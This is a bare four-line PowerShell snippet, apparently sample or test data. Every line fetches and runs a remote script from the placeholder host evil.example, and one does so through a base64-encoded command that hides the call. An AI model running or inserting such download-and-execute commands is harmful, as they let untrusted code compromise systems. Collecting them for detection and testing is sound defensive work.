$encoded = "SQBFAFgAIAAoAGkAdwByACAAaAB0AHQAcABzADoALwAvAGUAdgBpAGwALgBlAHgAYQBtAHAAbABlAC8AcABhAHkAbABvAGEAZAApAA=="
powershell.exe -NoProfile -EncodedCommand $encoded
IEX (iwr https://evil.example/payload.ps1)
Invoke-Expression (New-Object Net.WebClient).DownloadString('https://evil.example/payload.ps1')
